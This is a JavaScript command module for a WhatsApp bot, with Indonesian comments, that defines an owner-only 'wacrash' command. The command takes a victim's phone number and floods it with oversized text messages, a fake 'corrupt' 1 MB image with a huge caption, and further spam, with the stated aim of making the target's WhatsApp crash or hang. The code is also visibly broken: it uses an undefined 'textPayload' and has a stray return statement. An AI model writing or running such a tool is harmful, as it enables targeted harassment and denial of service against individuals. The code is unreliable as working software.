const config = require('../../config');
const fs = require('fs');
const path = require('path');

module.exports = {
command: ['wacrash', 'bugwhatsapp'],  
  intent: ['crash', 'forceclose', 'bugwa', 'killapp'],    
  tags: ['owner', 'exploit'],    
  desc: 'Mengirim payload bug brutal untuk membuat WhatsApp target force close atau hang (Khusus Owner).',


handler: async (m, { sender, text }) => {
    const isOwner = config.owner_number.includes(sender.split('@')[0]);        if (!isOwner) return null;

    const args = text.split(' ');        
    if (args.length < 2) {
        m.reply(`💥 Penggunaan: wacrash <target_number>\nContoh: wacrash 6281234567890`);            
        return null;
        } 
        const target = args[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    m.reply(`💣 Memulai serangan payload brutal ke${args[1]}... Ini akan mencoba memaksa WhatsApp target force close atau hang total.`);        return 
    { action: { name: 'execute_whatsapp_crash', data: { target}}};
    }, execute: async (m, { sock}, { target }) => {
    try {
        console.log(`[WACRASH] Mengirim payload bug brutal ke${target}`);
        
        // Payload 2: Membuat file media"korup" dengan metadata rusak
        const corruptMediaPath = path.resolve('./tmp/corrupt_crash.jpg');            fs.writeFileSync(corruptMediaPath, Buffer.alloc(1024*1024, 0xFF)); // File 1MB penuh data rusak
        
        // Langkah 1: Kirim text payload berulang untuk membebani memori
        for (let i = 0; i < 5; i++) {
            await sock.sendMessage(target, { text: textPayload });                console.log(`[WACRASH] Text payload${i+1}/5 dikirim ke${target}`);}            // Langkah 2: Kirim media korup dengan caption overload
        await sock.sendMessage(target, {
            image: { url: corruptMediaPath}, 
            caption: Array(5000).fill('CRASH_').join('')            
            });            
            console.log(`[WACRASH] Media korup dikirim ke${target}`);            
        // Langkah 3: Flood pesan tambahan untuk memastikan overload
        for (let i = 0; i < 3; i++) {
            await sock.sendMessage(target,
             {
              text: '💣SYSTEM_OVERLOAD💣' + Array(2000).fill('X').join('') });                console.log(`[WACRASH] Flood payload${i+1}/3 dikirim ke${target}`);}            await sock.sendMessage(m.key.remoteJid, { 
            text:`💣 Payload brutal telah dikirim ke${target.split('@')[0]}! WhatsApp target kemungkinan besar force close atau hang total sekarang.` 
        }, { quoted: m });
            console.log(`[WACRASH] Serangan selesai untuk${target}`);            
        // Bersihkan file sementara
        if (fs.existsSync(corruptMediaPath)) {
            fs.unlinkSync(corruptMediaPath);} } catch (error) {
        console.error("🚫 Eksekusi WhatsApp Crash Brutal Gagal:", error);            await sock.sendMessage(m.key.remoteJid, { 
            text:`Gagal mengirim payload brutal:${error.message}` 
        }, { quoted: m });
        } 
        }};